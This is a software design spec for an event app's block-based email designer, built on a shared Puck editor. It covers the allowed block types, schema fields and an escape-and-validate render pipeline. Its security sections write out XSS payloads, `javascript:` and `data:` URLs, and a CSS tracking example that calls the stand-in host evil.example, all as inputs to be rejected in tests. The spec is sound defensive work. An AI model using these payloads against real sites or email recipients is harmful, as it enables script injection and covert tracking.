# M6-T4 — Email designer via shared block engine (stretch)

Research Lead, 2026-07-16. Screen references: `prototype/prototype/event-emails.html` (topbar "Open Email Designer" button — currently disabled, this is the only prototype mockup that mentions the designer at all; **no prototype screen depicts the designer's own UI** — this ticket is explicitly marked "stretch," goes beyond the prototype's 17 screens, and its visual design is genuinely new ground for the UX Designer, not a reconciliation against an existing mockup) and `prototype/prototype/event-page-builder.html` (the block-engine visual precedent this ticket reuses: 3-pane builder, palette, device toggles, Save draft/Publish chrome). Builds on `agents/docs/specs/m6-emails-admin.md` (M6-T2, Done — compose/preview/test-send surface, `EmailDefinition` entity) and `agents/docs/specs/m4-website-blocks.md` + `agents/docs/design/m4-website-blocks.md` (M4-T1, Done — the three new Puck blocks + existing six content blocks). Deps: M6-T2, M4-T1 (both Done).

## The one fact that governs this entire spec

M6-T2's Shared decisions record: *"T2 compose is plain text + merge tags; the designer is T4... No organizer-authored raw HTML exists anywhere in T2 — that invariant is what makes the preview safe... and is exactly what T4's block designer replaces."*

**T4 is the first ticket in this app's history where an organizer's authored content can influence the *structure* of HTML markup sent to a real recipient, not just text content dropped into a fixed, pre-written template.** Every other email surface in this app (T1's transport, T2's compose) preserved a simple invariant: the only thing organizers type is prose, and prose is HTML-escaped before it ever touches a tag. T4 ends that invariant on purpose (that is the entire feature) and must replace it with an equally strong one: **a finite, server-validated allowlist of block types, each with its own from-scratch, table-based, escape-and-validate-per-prop HTML renderer — never a generic "render whatever the client sent" path.** Section 3 below is the load-bearing section of this spec; everything else is UI/UX detail built on top of it.

## Shared decisions

- **Block-designer content is a *new, additive* authoring mode, not a replacement.** `EmailDefinition` gains `bodyMode: "text" | "blocks"` (default `"text"`) and `bodyBlocks: EmailPuckBlock[]` (default `[]`). The existing plain-text `subject`/`body` fields (M6-T2 §2) are **untouched in shape and meaning** and remain the fields every T3-wired trigger, test-send, and the confirmation-preview card already read when `bodyMode === "text"`. Opening the designer does not mutate anything until the organizer *saves while in Block-designer mode* — at that point `bodyMode` flips to `"blocks"` and `bodyBlocks` is written; the plain-text `body` is **not deleted**, so switching back to Plain-text mode and saving again restores the old text-authored path without data loss, and switching forward again restores the last-saved block design. Both fields persist independently, "last write in that mode wins" (same posture as T2 §8-7's whole-doc-upsert convention) — there is deliberately no destructive one-way conversion.
- **No draft/publish state for designer content (decision, diverges from M4-T1's page-builder model on purpose).** M4-T2's per-path pages have draft vs. published content because a public web page benefits from "preview before it goes live." An `EmailDefinition`'s body has never had that concept in T2 either (every save is immediately the live template) — T4 keeps that posture. Saving a block design updates the live `bodyBlocks` immediately, exactly like editing `subject`/`body` today. Rationale: introducing draft/publish here would be new complexity with no corresponding user story (nobody "publishes" an email definition the way they publish a web page — the definition's `enabled` flag already gates whether it can fire, per T2 §2).
- **The render pipeline has exactly one entry point, extended, not duplicated.** `renderEmailDefinitionPreview` (`src/features/emails/server/render.ts`) is already the single function every consumer calls — T2's editor preview, confirmation-preview card, test-send, and (confirmed by grep) all of M6-T3's real trigger paths (`fire-on-submit-email.ts`, `fire-on-accept-email.ts`, `paged-trigger-runner.ts`, the `email-all` route). T4 adds exactly one internal branch to this function: `bodyMode === "text"` keeps calling the existing `deriveBodyHtmlTemplate(bodyTemplate)`; `bodyMode === "blocks"` calls a new sibling, `deriveBodyHtmlFromBlocks(bodyBlocks)`. Both produce a "bodyHtml template" string (pre-merge-tag-substitution) that is fed into the **same, unmodified** `renderEmailTemplate` merge-tag pass. Consequence: **every existing caller — including M6-T3's already-shipped, already-reviewed trigger code — gets block-designer support for free, with zero changes to those call sites.** This is the single biggest architectural reason this ticket is tractable as a "shared block engine" reuse rather than a parallel send pipeline.
- **The Puck editor *shell* is reused (the `<Puck>` component from `@measured/puck`, drag-drop canvas, palette, field editors); the *block registry* is a separate, smaller `Config` object, not a filtered version of the web page's.** Concretely: a new `createEmailPuckConfig(...)` sibling to `createEventPagePuckConfig` (co-located in `src/features/event-pages/puck.tsx` or a sibling file in the same directory, per the ticket's own code-location note) shares field-level primitives (the `createImageField` custom control, `defaultProps`) where the prop *shape* is identical, but every block's `render` function is necessarily different, because the web blocks render React/Tailwind (flexbox/grid, decorative non-functional CTA spans) and email requires table-based, inline-styled, no-flexbox, no-grid, no-JS HTML strings. **Reusing the web `render` closures for email output is not an option — it would ship a Puck web-preview-styled div soup that Outlook cannot lay out at all.** What *is* shared, and what "shared block engine" concretely means here: the same finite list of block *types* and *prop schemas*, edited through the same editor UI, so an organizer's mental model ("Hero, Highlights, Story, Schedule, FAQ, plus the registration/pricing blocks") carries across pages and emails — the HTML that comes out the other end is necessarily surface-specific.
- **Two preview surfaces coexist, and this is disclosed to the organizer, not hidden.** The Puck **canvas** (while dragging/dropping/editing) reuses the existing web `render` functions unmodified — this gives a pleasant, familiar WYSIWYG-ish authoring experience and is the cheapest way to honor "reuse the editor shell." It is **not** a faithful preview of the final email. The existing sandboxed iframe (`EmailPreviewFrame`, `sandbox=""`, `srcDoc`) sitting alongside the canvas is the **authoritative** preview — it renders the real, table-based, email-safe HTML the recipient will actually receive, via the same server-side `renderEmailDefinitionPreview` call every other T2 surface already uses. The canvas carries a persistent, non-dismissable caption: *"This canvas is an approximate preview for editing — email clients render differently. See Email preview below for the real result."* Section 4 has the full UI-scope writeup.
- **Every email-safe block's user-typed text props flow through the exact same escape-then-substitute contract T1/T2 established — per prop, not per whole-template — and every URL-typed prop is validated against an explicit scheme allowlist, independently of escaping.** Section 3 is the normative definition; nothing here weakens the invariants documented in `agents/docs/security/m6-emails-admin.md` and `agents/docs/security/m6-email-infrastructure.md` (escape-then-substitute, header-safe subjects, sandboxed preview, org/tenancy isolation, size caps before writes) — it extends them to a genuinely new input surface (block prop values) that did not exist before this ticket.
- **No new merge tags.** The existing 14-tag catalog (`src/lib/email/merge-tags.ts`) is reused verbatim inside block prop text (e.g., a Hero heading containing `{first_name}`) — braces/lowercase/digits/underscore survive `escapeHtml` by construction (established T1 invariant), so embedding a tag inside an escaped prop string and running the existing substitution pass over the assembled HTML afterward is safe and requires no renderer changes. No genuine need for a new tag was found during this research pass (see Open questions for the one candidate considered and declined).
- **Permissions/tenancy are entirely inherited from T2, unchanged.** `bodyMode`/`bodyBlocks` join the *same* editability bucket as `subject`/`body` in T2 §2's table (editable for both `isSystem` and custom definitions) — they are not a new locked-field category. Every route T4 touches is the existing `PATCH .../definitions/[kind]` route (already gates `write:events`, already rate-limited per the M6-T2 security fix); T4 does not add a new API route, only new fields to the existing patch schema and a new response shape for the preview route.

## 1 — Email-safe block registry (the per-block decision)

*As an event organizer, I want to drag the same kinds of content blocks I already use on my event page into an email, and have every block either look right or clearly tell me it can't be used here — never silently break.*

The web page builder's current registry (`src/features/event-pages/puck.tsx`) has **nine** block types. This ticket makes an explicit, individual call on each.

| Block | Verdict | Why |
|---|---|---|
| `Hero` | **Safe, modified** | Drop the two-column CSS grid layout (`lg:grid-cols-[1.15fr_0.85fr]`) — stack image above/below text in a single column, always (no side-by-side layout in any email block, see rationale below). Drop the radial-gradient background (`bg-[radial-gradient(...)]`) — Outlook (Word engine) does not render CSS gradients; fall back to a solid, explicit `bgcolor`. **Drop the two CTA spans (`primaryCtaLabel`/`secondaryCtaLabel`) from the email render entirely** — on the web these already render as non-functional decorative spans (not links; confirmed by reading `puck.tsx`), and a button-shaped element that does nothing is actively misleading in an email, where the entire point of a "button" is to be clicked. The props remain stored (for round-trip consistency if an organizer switches back to the web builder's mental model) but are simply not rendered in the email HTML. Heading/body/image render as escaped text + a validated `<img>`.
| `Highlights` | **Safe, modified** | The 3-column grid becomes a single-column stacked list (three consecutive table rows). No side-by-side layout (see rationale below).
| `Story` | **Safe, modified** | Image+text side-by-side becomes stacked. `imageSide` is still meaningfully honored in a single column: `imageSide: "left"` → image renders first, then text; `imageSide: "right"` → text first, then image. This preserves organizer intent without needing a real two-column table.
| `Schedule` | **Safe, as-is** | Heading + a `white-space:pre-line` text block (broadly supported as an inline style) — no grid, no interactivity. Confirmed by reading the current render: it is already a single static text block.
| `Faq` | **Safe, as-is** | Confirmed by reading the current render: all three Q/A pairs render fully expanded already (no accordion/JS toggle exists in the web version either) — nothing to degrade.
| `CallToAction` | **Excluded** | Has no `href`/URL prop at all — on the web it renders as a decorative, non-functional span (confirmed by reading `puck.tsx`: `<span>{buttonLabel}</span>`, no `<Link>`, no `href`). A "call to action" with nowhere to go is worse than useless in an email; shipping it would train recipients to tap dead buttons. **Recommendation to organizers (surfaced in the palette's disabled/excluded tooltip): use Registration Embed instead**, which has a real destination. Not modified into a linkable block in this ticket — adding a URL prop to `CallToAction` is out of scope (would touch the web block too; flagged as an open question, not decided here).
| `RegistrationEmbed` | **Safe, modified, one branch excluded** | The "≥1 active path" branch (`registrationCta.state === "open"`) becomes a real, absolute-URL, table-based bulletproof button linking to `/events/[eventId]/register` (email links must always be absolute — there is no "current origin" in an inbox). The "closed" branch (paths exist but none active, or form unpublished) becomes static disabled-styled text, matching the web's existing state semantics. **The "0 paths ever configured" legacy-inline-form branch is excluded from email** — an inline HTML form with client-side submission logic cannot function inside an email client (no JS, no fetch, most clients strip or refuse to render `<form>` at all as a phishing signal). When a definition's event has zero paths, the email-mode block instead renders the same static "closed" notice, with copy pointing at `{event_url}` (already in the T1 catalog) as a graceful link back to the live event page rather than a broken inline form.
| `TicketPricingTable` | **Safe, modified, with an explicit freshness divergence — see below** | The web version is *already* a semantic HTML `<table>` (a good sign), but it's styled with Tailwind utility classes (rounded corners, `hover:`, a Tailwind-driven `hidden sm:block`/`sm:hidden` responsive card/table swap) that Outlook's Word engine does not honor. The email renderer is a from-scratch plain `<table border-collapse>`-equivalent with inline styles and no responsive alternate layout — one table, for every client (mobile mail clients render narrow tables fine, horizontally scrollable at worst; this is a fully acceptable, common email pattern).
| `CountdownTimer` | **Safe, but *only* as a static send-time snapshot — no ticking digits** | There is no JavaScript in any email client, ever. The four ticking unit tiles (days/hrs/min/sec) that are the entire point of this block on the web **cannot exist in email**. The block renders the **absolute target date/time only** ("Event starts September 15, 2026, 9:00 AM ET" — reusing the exact string the web block's own `formatCountdownTarget`/sr-only line already computes), generated once at render/send time. This is an honest, deliberately reduced feature, not a fake countdown that would silently go stale and look broken the moment a recipient opens the email a day after it was sent. The alternative (an externally-hosted, server-regenerated countdown GIF, which is how Cvent/most ESPs actually solve this) is **not attempted in this ticket** — flagged as Open question OQ-3, a real future ticket, not solved here.

**Rationale for "no side-by-side layout in any email block, ever" (a blanket decision, not per-block):** two-column table layouts (`<td>` beside `<td>`) *are* technically renderable in Outlook and most clients, but reliable cross-client responsive behavior for them requires either (a) fixed non-responsive two-column layouts that go tiny/unreadable on narrow mobile clients that don't honor media queries (older Outlook mobile, some webmail clippers), or (b) hybrid fluid/hybrid-table techniques with MSO conditional comments and `max-width` fallback hacks that meaningfully raise implementation and QA complexity for a stretch ticket. Given the KISS principle and this ticket's own scope ("email-safe block subset," not "pixel-parity block subset"), single-column stacking for every block is the simpler, more reliably correct choice, at the cost of a plainer visual layout than the web page. This trade-off should be revisited only if organizer feedback demands it (see Open questions).

**Acceptance criteria**
1. The email designer's block palette contains exactly 8 entries: Hero, Highlights, Story, Schedule, Faq, Registration Embed, Ticket & Pricing table, Countdown timer — `CallToAction` never appears in this palette (verified by asserting the email `Config`'s `components` keys directly, not by a UI screenshot).
2. Every text-bearing prop on every allowed block (heading, body, intro, labels, Q/A pairs, agenda text) renders as HTML-escaped text in the assembled email HTML — a literal `<script>alert(1)</script>` typed into any block's any text field renders as visible literal text in both the canvas (React-escaped by construction) and the authoritative email preview (server-escaped, asserted in a test), never executes.
3. Hero's `primaryCtaLabel`/`secondaryCtaLabel` values are preserved in `bodyBlocks` storage (round-trip safe) but produce **no** rendered button/link element in the email HTML output — confirmed by asserting the rendered HTML contains neither string wrapped in an anchor or button-styled span.
4. Story's `imageSide` prop changes rendered order (image-first vs. text-first) in the single-column email output; it never produces a two-column layout.
5. RegistrationEmbed in email mode: an event with ≥1 active path renders an absolute-URL `<a>` (not a relative path, not a `<button>`/`<span>` without `href`); an event with paths but none active, or an unpublished form, renders the static disabled notice; an event with zero paths ever configured renders the static notice with an `{event_url}`-based link, never an inline `<form>`.
6. TicketPricingTable in email mode renders the exact ticket/price rows the live public-page projection would have shown **at the moment the email was rendered/sent** — see AC-9 below for the explicit freshness divergence this creates versus M4-T1's live-web-page behavior.
7. CountdownTimer in email mode never renders numeric tiles; it renders only the resolved absolute target string (or the block's `completedMessage` if the target has already passed at render time) — asserted by checking the rendered HTML contains no `\d+ *: *\d+` ticking-tile markup and does contain the formatted absolute date.
8. An `EmailDefinition.bodyBlocks` entry whose `type` is not in the current email-safe allowlist (e.g., a stored `CallToAction` block from before it was excluded, or any future removed type) is **skipped at render time**, never crashes the render, never falls back to rendering its raw props unstyled — mirrors T2 §8-4's "deleted/unknown kind renders a raw chip, never a crash" honesty pattern, applied to blocks instead of definitions.
9. **Freshness divergence, explicit and tested:** unlike M4-T1's `TicketPricingTable` on the public web page (AC-6 there: "Fee or ticket edited after page publish → next public request reflects it without republishing the page" — live read, no snapshot, by deliberate design), the **email** rendering of the same block type is a **snapshot as of render/send time** — an email, once delivered, cannot re-fetch data. A ticket price changed after a test-send or a real trigger-fired send does **not** retroactively change the content of an already-delivered email; only a **new** render (a fresh preview, a fresh test-send, or a fresh trigger fire) reflects the new price. This is documented in the editor UI itself (a small note under the block's field panel when in email mode: "Prices shown reflect the moment this email is generated — not live at open time, unlike the website block of the same name.").

## 2 — `EmailDefinition` schema additions

**New fields** (extends the M6-T2 §2 entity, does not replace any existing field):

```
bodyMode: "text" | "blocks"          // default "text"
bodyBlocks: EmailPuckBlock[]         // default []; only meaningful when bodyMode = "blocks"
```

```
EmailPuckBlock = {
  id: string;                        // stable per-block id, Puck convention (ensurePuckDataIds precedent)
  type: EmailSafeBlockType;           // one of the 8 allowlisted type strings (§1) — Zod enum, not a free string
  props: Record<string, unknown>;    // per-type shape, validated by a per-type Zod schema, not passed through opaquely
}
```

- **`bodyMode`/`bodyBlocks` join the *same* editability bucket as `subject`/`body`** in T2 §2's table: editable for `isSystem` **and** custom definitions alike (not a new locked-field category; `isSystem` still locks `name`/`kind`/`group`/trigger-type/`audience` exactly as before).
- **Two new size/count caps**, additive to T2/T1's existing caps (which are unchanged and still enforced on the *rendered* output):
  - `EMAIL_BODY_BLOCKS_MAX_COUNT = 20` — a definition may hold at most 20 blocks. Rejected at the API boundary (typed validation error), not a silent truncation.
  - `EMAIL_BODY_BLOCKS_MAX_BYTES` (serialized JSON, recommend 48 KB) — a defensive doc-size cap on the *stored* Puck content array, independent of the existing 32 KB cap on the plain-text `body` field (which is untouched) and independent of the existing 256 KB cap on *rendered* `bodyHtml` (which still applies, unchanged, to the output of `deriveBodyHtmlFromBlocks` — see §3 AC-4). Block JSON is normally far smaller than its rendered HTML (a block stores an image *URL*, not image bytes), so this cap is a cheap defense-in-depth ceiling, not the primary control — the primary control remains the existing rendered-bytes check.
- **Server-side re-validation on every write, not just Zod-shape validation:** each `EmailPuckBlock.type` must be a member of the current `EMAIL_SAFE_BLOCK_TYPES` allowlist and each `props` object must pass that type's *specific* prop schema (e.g., `imageUrl` fields are validated as `http(s)://`-scheme absolute URLs at write time, not just "a string") — this closes the gap where a direct API call (bypassing the Puck UI entirely) could otherwise smuggle an unvalidated prop value into storage. Write-time rejection (typed 400, zero writes) is the primary control; render-time skip-unknown-types (§1 AC-8) is the defense-in-depth backstop for data that predates a registry change.

**Acceptance criteria**
1. `PATCH .../definitions/[kind]` accepts `bodyMode`/`bodyBlocks` in its patch body under the exact same auth/rate-limit/locked-field rules already governing `subject`/`body` (no new route, no new permission tier).
2. A `bodyBlocks` array with an unrecognized `type` string, or a recognized type with a prop failing its per-type schema (e.g., `imageUrl: "javascript:alert(1)"`), is rejected at write time with a typed 400 and zero writes — never silently stored and only caught at render time.
3. Exceeding `EMAIL_BODY_BLOCKS_MAX_COUNT` or the serialized-bytes cap is rejected at write time, distinctly from the existing 32 KB `body` / 256 KB rendered-`bodyHtml` caps (three independent, clearly-labeled limits, not one conflated number).
4. Switching `bodyMode` from `"blocks"` back to `"text"` and saving does **not** clear `bodyBlocks` — a subsequent switch back to `"blocks"` restores the prior design (tested: block→text→block round-trip preserves content byte-for-byte).
5. A definition created before this ticket shipped (no `bodyMode`/`bodyBlocks` fields at all) reads as `bodyMode: "text"`, `bodyBlocks: []` via schema defaults — no backfill/migration needed (same "schema default proven by loading a legacy doc unmodified" pattern as M4-T2 AC-27).

## 3 — The render pipeline: Puck block data → email-safe HTML (security-critical core)

*As a security reviewer, I want a provable guarantee that no combination of organizer-authored block content can ever produce a `<script>` tag, an event-handler attribute, a dangerous URL scheme, or a CSS-injection vector in the HTML sent to a real recipient.*

### 3.1 The five controls, in the order they run

For a definition with `bodyMode === "blocks"`, `deriveBodyHtmlFromBlocks(bodyBlocks)` runs, per block, in this fixed order — no control is optional, and no control alone is considered sufficient (defense in depth):

1. **Type allowlist check.** `block.type` must be a member of `EMAIL_SAFE_BLOCK_TYPES` (§1's 8 entries). A block whose type is not in the list is **skipped** (not rendered, not an error, per §1 AC-8) — this is re-checked at render time even though write-time validation (§2 AC-2) already enforced it, because stored data can predate a registry change.
2. **Per-prop schema validation** (re-run at render time, not just at write time — belt-and-suspenders against any path that could have written a doc without going through the write-time schema, e.g., a future migration script). Every prop is one of exactly three kinds, each with its own control:
   - **Free text** (heading, body, intro, labels, Q/A pairs, agenda) → passed through `escapeHtml` (the *exact same function* `src/lib/email/merge-tags.ts` already exports and T1/T2 already rely on — not a new escaping implementation) **before** being interpolated into the block's HTML skeleton. This is identical in spirit to T2's `deriveBodyHtmlTemplate`, just applied per-prop-string instead of over one whole template.
   - **URL-typed** (`imageUrl` on Hero/Story; the resolved `registerHref`/`event_url` targets on RegistrationEmbed) → validated against an **explicit scheme allowlist**: only `https://` and `http://`, absolute only (no relative URLs — there is no "current page" in an inbox to resolve against), no `javascript:`, `data:`, `vbscript:`, `file:`, or protocol-relative (`//`) values. **Escaping alone does not neutralize a dangerous URL scheme** (`escapeHtml("javascript:alert(1)")` is still a live `javascript:` URL after escaping — escaping only protects against breaking *out* of the attribute, not against the browser interpreting the scheme it names) — this is why URL validation is a **separate, mandatory control from escaping**, not a substitute for it. A prop that fails scheme validation is dropped and the block falls back to its no-image / no-link default state (never silently passes the raw string through).
   - **Enumerated choice** (`imageSide: "left"|"right"`, `target: "eventStart"|"custom"`) → validated against the literal enum at both write time (Zod) and render time (a `switch`/lookup with an explicit default, never string-interpolated into a `style` attribute). **No block prop is ever a free-text CSS/style string** — every visual variation available to an organizer is expressed as an enum choice mapped, in code, to a fixed, reviewed set of inline styles. This closes the CSS-injection vector (an attacker-controlled `style="background-image:url(https://evil.example/track?...)"` is a real, documented email-tracking/exfiltration technique when platforms allow free-text style input — this app's block registry structurally cannot express one, because there is no free-text style prop anywhere in the allowlist).
3. **Contextual output encoding at every interpolation site.** Every attribute value emitted by any block renderer is (a) always double-quoted (never unquoted, never single-quoted) and (b) always passed through `escapeHtml` (for text-context values) or the URL validator (for URL-context values, itself followed by `escapeHtml` of the validated string before insertion, since `escapeHtml` on an already-validated `https://...` URL is a no-op for the characters that matter but remains cheap defense-in-depth against any accidental encoding mismatch). No template literal anywhere in the block renderers concatenates a raw prop string directly adjacent to `=` without both of these.
4. **Assembly, then the existing merge-tag pass, unmodified.** Once every block's HTML skeleton is built (with escaped/validated values already slotted in), all block HTML strings are concatenated into one `bodyHtml` template string — this is the return value of `deriveBodyHtmlFromBlocks`, structurally identical in *role* to `deriveBodyHtmlTemplate`'s return value in the text-mode path. This template string (plus the definition's `subject`, plus a parallel plain-text derivation — §3.3) is then passed into `renderEmailTemplate` **exactly as today, with zero changes to that function**. Because `{first_name}`-style merge tags embedded inside an already-escaped block prop string survive `escapeHtml` unchanged (braces/lowercase/digits/underscore are outside `escapeHtml`'s replacement set — an established, already-security-reviewed T1 invariant), `renderEmailTemplate`'s existing `TAG_RE` pass finds and substitutes them in the assembled block HTML exactly as it already does in plain-text-derived HTML. **Merge-tag values are independently re-escaped on the way in by `renderEmailTemplate` itself** (unchanged, already reviewed) — so even if a future context source became attacker-influenced, a value containing `<script>` is still safe.
5. **No block renderer ever emits `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, `<style>` (except the single, fixed, code-authored `<style>`/`<meta>` block in the outer document wrapper — never organizer-influenced), or any `on*=` event-handler attribute — by construction, not by filtering.** The 8 block renderers are a fixed, finite, reviewed set of server-only template functions; there is no "custom HTML" or "embed code" block type in the email-safe registry, and **there must never be one** — this is a permanent invariant for this feature, restated in Non-goals below, not just a T4-scope limitation to revisit later.

### 3.2 Why the sandboxed preview iframe's role changes with this ticket

T2's security review (`agents/docs/security/m6-emails-admin.md` §2) correctly noted the `sandbox=""` iframe was defense-in-depth *on top of* an invariant ("no raw HTML exists") that made it redundant in practice — there was nothing for the sandbox to actually stop, because escaping happened before any HTML existed to sandbox. **That redundancy ends with this ticket.** T4 introduces the first genuinely user-controlled input (block prop values, now including URL-typed and enum-typed props, not just prose) that flows into HTML *structure*, not just escaped text inside a fixed shell. The `EmailPreviewFrame`'s `sandbox=""` + `srcDoc` combination (`src/features/emails/components/email-preview-frame.tsx`, unchanged by this ticket) is now a **genuinely load-bearing second control**: if §3.1's escape/allowlist/URL-validation pipeline has a bug, the sandboxed iframe is what stops a preview-time script execution from actually running in the organizer's own browser session while they're editing. **Security review of this ticket should treat the block-render allowlist/escaping code with the same rigor as a rich-text/WYSIWYG-editor XSS review** (the class of bug this most resembles is not "did we forget to escape a merge tag" — T1/T2 already solved that — it is "did we forget to validate a URL scheme on some prop, forget to quote some attribute, or accidentally add a free-text style prop somewhere") — this is the single most important thing for Security to pre-read before this ticket reaches their gate.

### 3.3 Plain-text fallback (bodyText) for block-mode definitions

Every email needs a `bodyText` (multipart/alternative) part — T1's `sendEventEmail`/`validateRenderedEmailContent` already require one and cap it at 64 KB, unchanged. For `bodyMode === "text"` this is trivially the template itself (unchanged). For `bodyMode === "blocks"`, `deriveBodyHtmlFromBlocks`'s sibling derives a plain-text version by walking the same block list and extracting only their text-bearing props in reading order (heading, then body/intro, then any Q/A pairs, joined with blank lines) — non-text blocks degrade to a short descriptive line (e.g., TicketPricingTable → "View current ticket pricing: {event_url}"; CountdownTimer → the same absolute-target string used in the HTML version; an image-only Hero with no heading/body → nothing, never a broken empty line). **No separate manual plain-text authoring surface is added in T4** — automatic derivation only (see Non-goals; this mirrors how most ESPs, including Cvent, auto-generate the text part from a visual design rather than asking the organizer to write it twice).

**Acceptance criteria**
1. A block prop containing `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `"><svg onload=alert(1)>` typed into any text-bearing field renders as visible literal escaped text in the assembled `bodyHtml` — asserted directly against the rendered HTML string (not just "the sandboxed iframe stopped it"), for every one of the 8 allowlisted block types, mirroring the rigor of T2 §3 AC-3's single test but multiplied across the new surface.
2. An `imageUrl` prop containing `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`, or a bare relative path (`/foo.png`) is **rejected** (dropped, block falls back to its no-image state) — never interpolated into a `src` attribute — asserted for both Hero and Story.
3. No block renderer ever accepts or emits a free-text `style` attribute value sourced from an organizer-typed prop — asserted by a source-level test (grep/AST check across the block-renderer module for any string-interpolated `style="` built from a non-enum prop) as well as a runtime test.
4. The assembled `bodyHtml` for a maximal (20-block) definition, once through the full pipeline, still passes the existing, unmodified `validateRenderedEmailContent` 256 KB cap for realistic content (a test fixture with representative-length text/typical image URLs stays comfortably under the cap; a deliberately pathological all-text-maxed-out fixture is allowed to legitimately fail this check with the existing typed `BODY_HTML_TOO_LARGE` rejection — the cap is not raised for block mode).
5. A definition's `bodyBlocks` referencing a since-removed/never-allowlisted block type renders every *other* block normally and simply omits the unknown one — no crash, no partial-HTML corruption, consistent with §1 AC-8.
6. `renderEmailTemplate` itself is **not modified** by this ticket (a source-diff check / import-boundary-style test asserts `src/lib/email/merge-tags.ts` has no behavioral changes beyond, at most, type additions) — the merge-tag substitution/escaping-of-values contract that T1's security review already approved is reused verbatim, not reimplemented.
7. The plain-text derivation (§3.3) for a block-mode definition never exceeds the existing 64 KB `bodyText` cap for realistic content, and never contains raw, unescaped HTML tags (it is genuinely plain text, not HTML with tags stripped naively — e.g., no leftover `&amp;` entities from a naive strip-tags-after-render approach; the correct implementation walks the block *props* directly, not the rendered HTML).

## 4 — UI scope: what "Open Email Designer" actually opens

*As an event organizer, I want one obvious way into a richer, visual way of designing an email, without a second, disconnected "email builder" screen to learn.*

- **"Open Email Designer" becomes a definition picker, not a standalone page.** The topbar button (currently disabled, `src/features/emails/components/emails-workspace.tsx`) becomes a dropdown/menu listing every lifecycle email definition by name + group (reusing the existing `definitionsByKind`/list data already loaded on this screen — no new fetch). Selecting one opens the **same** `EmailEditorDialog` (`src/features/emails/components/email-editor-dialog.tsx`) already used for row-click editing (§3 of the M6-T2 spec), pre-set to Block-designer mode. This is a deliberate choice to avoid inventing a second top-level "designer landing page" that would fork the editing experience T2 already shipped — "reuse the shell, don't fork it" is honored at the screen level, not just the component level.
- **The editor dialog gains a mode toggle** ("Plain text" / "Block designer", a two-option segmented control or tab pair) mapped directly to `bodyMode`. Switching modes in the open dialog is instantaneous and non-destructive (§2 AC-4) — a confirm-nothing operation, since nothing is deleted, only which body the Save button will persist as "live" changes.
- **Block-designer mode replaces the plain-text textarea with the Puck canvas + palette** (the 8-block registry from §1), and adds the "authoritative preview is below, canvas is approximate" banner from Shared decisions. The existing "Insert merge tag" menu (§3 of M6-T2, listing all 14 catalog tags) is **retained**, scoped to whichever text field currently has focus inside a block's field panel (Puck's field-editing sidebar), not the removed textarea.
- **The existing sandboxed preview pane (`EmailPreviewFrame`) is unchanged in component shape** — it already accepts a `bodyHtml`/`subject`/warnings shape from the server; it now simply receives the output of `renderEmailDefinitionPreview` when `bodyMode === "blocks"` instead of `"text"`, with zero changes to the component itself (confirmed: the component has no knowledge of *how* `bodyHtml` was derived, only that it's a trusted server-rendered string — this is precisely why this integration is low-risk).
- **No new API route.** The existing `/emails/preview` route (already returns a rendered preview shape) and `PATCH .../definitions/[kind]` (already the save endpoint) both already exist; T4 only widens their request/response shapes to carry `bodyMode`/`bodyBlocks`, per §2.

**Acceptance criteria**
1. "Open Email Designer" is enabled (no longer disabled/tooltip-only); clicking it opens a definition picker; selecting a definition opens `EmailEditorDialog` for that definition with the mode toggle pre-set to "Block designer".
2. Opening a definition that has never been edited in block mode (`bodyBlocks: []`) shows an empty canvas with the palette available — never a crash, never pre-populated with unrelated sample content.
3. Switching the mode toggle mid-edit, without saving, and closing the dialog triggers the existing unsaved-changes guard (T2 §3 AC-7, reused verbatim) — the guard does not need to know *which* mode's content changed, only that the doc is dirty.
4. The canvas-vs-preview distinction is visible and worded plainly (not just implied by layout) — an explicit statement, not merely "the two panels happen to look different."
5. Keyboard/focus: the mode toggle and the Puck canvas's own interactive elements are reachable via the same focus-trap/Esc-closes-with-guard convention already required of the dialog (T2 §3 AC-7) — Puck's own drag-and-drop is mouse-first by upstream design; this ticket does not attempt to fix any pre-existing Puck accessibility gap in drag-and-drop reordering (a keyboard-accessible reorder affordance, if Puck lacks one, is an upstream library concern, not something this ticket's scope covers — flagged, not solved, in Open questions if QA finds a real gap).

## 5 — Preview and test-send compatibility

*As an event organizer, I want the preview and test-send I already trust from T2 to keep working exactly the same way, whether an email is plain-text or block-designed.*

Because §3's `renderEmailDefinitionPreview` extension is the **only** change to the render path, and every consumer (editor preview, confirmation card, test-send, send-log detail, and — already shipped — every M6-T3 trigger path) calls that one function without knowing or caring how the template was authored, compatibility is close to automatic. What must be explicitly verified, not just assumed:

- **Test-send** (`POST .../emails/test-send`, M6-T2 §5) already calls `sendEventEmail` with a rendered `{subject, bodyHtml, bodyText}` shape — unchanged. A block-mode definition's test-send exercises the exact same `validateRenderedEmailContent` size/header-safety gate (unchanged, §3 AC-4/AC-7 above) before the outbox write. Disabled-definition refusal, dedupe-key minting, and the event-wide log's `kind:"test"` labeling (T2 §5) are all untouched.
- **Confirmation-preview card** (M6-T2 §4, renders the `confirmation-paid` definition) works unmodified for a block-mode `confirmation-paid` — including the real-QR / sample-QR fallback behavior, since `{qr_code}` substitution happens in the shared merge-tag pass (§3.1 step 4), identically regardless of authoring mode.
- **Send-log row detail** (M6-T2 §5) shows the *frozen* `bodyHtml` snapshot stored on the historical `EmailMessage` row — this was already immune to any later definition edit (T1's "sent is terminal" invariant) and remains so: a block-mode definition edited after a message was sent does not retroactively change that message's snapshot, exactly like a plain-text edit today.
- **One genuinely new consideration:** the freshness divergence for `TicketPricingTable`/`CountdownTimer` (§1 AC-9) means a **preview** taken now and a **test-send** taken five minutes later could show different prices/countdown text if the organizer edited pricing in between — this is expected and correct (both are "as of render time" snapshots, consistent with each other, just not consistent with each *other's* render time) and should not be mistaken for a bug during QA.

**Acceptance criteria**
1. Test-send of a block-mode definition produces one outbox row with a frozen `bodyHtml` snapshot containing the fully-assembled, escaped, merge-tag-substituted block HTML — identical in kind (frozen, immutable) to a plain-text definition's test-send row.
2. The confirmation-preview card renders correctly for a block-mode `confirmation-paid` definition, including the zero-attendee placeholder-QR fallback (M6-T2 §4 AC-1, unchanged).
3. A definition's `bodyMode` can differ from `confirmation-paid`'s in the same event without any cross-contamination — each definition's mode is independent (obviously true given the schema, but worth a direct multi-definition test given this is new ground).
4. Editing block content, then re-opening a previously-generated preview/test-send from the send log, shows the OLD frozen snapshot, not the new content — carrying forward T1 §2 AC-8 / T2 §3 AC-1's regression test to the block-mode case explicitly.

## 6 — Representative client-rendering test matrix (QA scope, per ticket's own assignment)

